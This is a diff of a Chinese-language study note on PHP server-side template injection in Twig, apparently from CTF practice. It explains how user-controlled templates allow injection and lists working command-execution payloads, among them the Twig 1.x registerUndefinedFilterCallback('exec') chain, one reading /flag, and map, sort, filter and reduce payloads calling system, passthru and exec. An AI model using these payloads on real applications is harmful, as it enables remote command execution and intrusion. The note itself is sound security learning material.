@@ -1,8 +1,20 @@
 ## PHP模板注入
 
+看到网上一张图：
+
+![模板](https://gitee.com/bx33661/image/raw/master/path/1904837406.png)
+
 ### Twig
 
 ![img](https://gitee.com/bx33661/image/raw/master/path/logo.md.png)
+
+> 官网翻译：
+>
+> 快速: Twig将模板编译为简单的优化PHP代码。与常规PHP代码相比，开销减少到最低限度
+>
+> 安全: Twig有一个沙盒模式来评估不受信任的模板代码。这允许Twig用作用户可以修改模板设计的应用程序的模板语言。
+>
+> 灵活: Twig由灵活的词法分析器和解析器提供支持。这允许开发人员定义自己的自定义标签和过滤器，并创建自己的DSL。
 
 参考文档：
 
@@ -10,13 +22,102 @@
 
 - https://xz.aliyun.com/t/10056?time__1311=Cqjx2DRiDtYmqGNDQiuB%3DDuiDnQCYCWK4D#toc-16
 
+
+
+```php
+$twig->render("Hello {{name}}", array('name' => $escaped_name));
+```
+
+- 第一个参数，用于指明这个操作将渲染哪个模版文件。
+- 第二个参数是一个数组，`array('name' => $escaped_name)`，它提供模版所占位的变量对应的值。
+
+渲染结果：
+
+```php
+Hello {{name }} => Hello dx....
+```
+
+如果这个`$escaped_name`形式和内容可以被用户控制的话，就可以实现注入
+
+在Twig中，`{{name}}`还可以接受一些表达式，最后输出表达式的结果，输出渲染
+
+
+
+Twig的注释：Twig 模板引擎默认的注释语法是 `{# ... #}`。
+
+例如：
+
+```twig
+{# 这是一个注释，不会显示在页面上 #}
+<p>这是一个段落，将会显示在页面上。</p>
+```
+
+在这个例子中，`{# 这是一个注释，不会显示在页面上 #}` 是一个注释，
+
+不会出现在最终的HTML输出中，而 `<p>这是一个段落，将会显示在页面上。</p>` 则会被正常渲染。
+
+画了一个使用注释判断的流程图：
+
+![image-20241025150328932](https://gitee.com/bx33661/image/raw/master/path/image-20241025150328932.png)
+
 #### Twig-1.x
 
-#### Twig-2
+`getFilter`函数：
+
+```php
+public function getFilter($name)
+  {
+    ...
+    foreach ($this->filterCallbacks as $callback) {
+    if (false !== $filter = call_user_func($callback, $name)) {
+    //出现call_user_func
+      return $filter;
+    }
+  }
+  return false;
+}
+
+public function registerUndefinedFilterCallback($callable)
+{
+  $this->filterCallbacks[] = $callable;
+}
+```
+
+利用这个可以构造
+
+> 在Twig 1.x中:**`_self`**：当前模板对象，可以用于调用当前模板中的宏（macro）
+
+```twig
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("[Command]")}}
+```
 
 
 
+#### Twig-2以及更高版本
 
+Payload：
+
+```twig
+{{["id"]|map("system")}}
+{{["id"]|map("passthru")}}
+{{["id"]|map("exec")}}    // 无回显
+
+{{["id", 0]|sort("system")}}
+{{["id", 0]|sort("passthru")}}
+{{["id", 0]|sort("exec")}}    // 无回显
+
+{{["id"]|filter("system")}}
+{{["id"]|filter("passthru")}}
+{{["id"]|filter("exec")}}    // 无回显
+
+{{[0, 0]|reduce("system", "id")}}
+{{[0, 0]|reduce("passthru", "id")}}
+{{[0, 0]|reduce("exec", "id")}}    // 无回显
+```
+
+
+
+...但是这个我还没遇见相应的问题，没有测试过
 
 
 
@@ -240,15 +341,11 @@ public function getStreamVariable($variable)
 - twig
 - Smarty
 
-
-
 Payload:
 
 ```
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
 ```
-
-
 
 ![](https://gitee.com/bx33661/image/raw/master/path/image-20241024103533563.png)
 
